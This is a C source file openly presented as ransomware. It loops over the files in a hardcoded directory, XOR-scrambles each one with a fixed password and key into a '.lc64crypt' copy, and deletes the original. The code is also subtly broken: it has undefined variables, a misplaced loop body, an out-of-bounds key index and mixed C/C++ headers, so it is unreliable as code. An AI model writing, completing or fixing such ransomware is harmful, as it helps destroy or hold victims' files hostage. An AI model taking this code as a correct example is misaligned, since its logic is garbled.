/**
 * @file "Ransomware.c"
 * @brief "Main file of this ransomware" 
 *
 * @author le01q <github.com/le01q>
 * @copyright lostcentury64 (C) 2022. All rights reserved.
*/

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <stdarg.h>
#include <lib/dirent.h>
#include <sys/types.h>

#define AND &
#define XOR ^
#define NOT !

int i = 0;

FILE *buffer;
FILE *ciphered;
FILE *readme;

float key[10] = 
{
    0.65, 
    100, 
    0.365, 
    0, 
    25.9, 
    999, 
    5, 
    12.58, 
    7.0214, 
    103.126 
};

float pre_calculated;

char path[] = 
{
    "C:/lc64ransom"
};

struct data_chars 
{
    char currentChar;
    char cipheredChar;
    char preCipheredChar;
} data;

struct cipher_attrib
{
    int password;
    char file[500];
    char c_file[500];
    char readmsg[500];
} c_attrib;

int main(void)
{
    DIR *dir;
    struct dirent *direntp;

    c_attrib.password = 900;

    dir = opendir(path);

    if (dir == NULL)
    {
        fprintf(stderr, "ERROR: Cannot open the files directory\n", perror);
        exit(EXIT_FAILURE);
    }

    while ((direntp = readdir(dir)) != NULL)
    {
	    fprintf(stdout, "Checking file: %s\n", direntp -> d_name);
	    strcpy(c_attrib.file, path);
	    strcat(c_attrib.file, "/");
	    strcat(c_attrib.file, direntp -> d_name);
	    strcpy(c_attrib.c_file, path);
	    strcat(c_attrib.c_file, "/");
    }

    if ((strcmp(direntp -> d_name, ".") == 0) && (strcmp(direntp -> d_name, "..") == 0))
    {
	    fprintf(stderr, "Skipping file: %s", c_attrib.file);
    }
    else if ((strcmp(direntp = d_name, ".") != 0) && (strcmp(direntp -> d_name, "..") != 0))
    {
	    buffer = fopen(c_attrib.file, "r"); // This open the file to cipher ;)

	    if (buffer == NULL)
	    {
		    fputs("ERROR: Opened failure or file doesnt exists!", stderr);
		    exit(EXIT_FAILURE);
	    }

	    strcat(c_attrib.c_file, direntp -> d_name);
	    strcat(c_attrib.c_file, ".lc64crypt");

	    ciphered = fopen(c_attrib.c_file, "w+"); // Create the ciphered file

	    if (ciphered == NULL)
	    {
		    fputs("ERROR: Opened ciphered file failed", stderr);
		    exit(EXIT_FAILURE);
	    }

	    while (!(feof(buffer)))
	    {
		    data.currentChar = fgetc(buffer);
		    data.preCipheredChar = (char)((int)data.currentChar XOR c_attrib.password);

		    for (i = 0; i <= 10; i++)
			    precalculated = (sharedkey[i] * c_attrib.password);

		    data.cipheredChar = (char)((int)data.preCipheredChar XOR (int)precalculated);
		    fputc(data.cipheredChar, ciphered);
	    }

	    fclose(buffer);
	    fclose(ciphered);
	    
	    strcpy(c_attrib.file, path);
	    strcat(c_attrib.file, "/");
	    strcat(c_attrib.file, direntp -> d_name);
	    remove(c_attrib.file);
    }
    return 0;
}
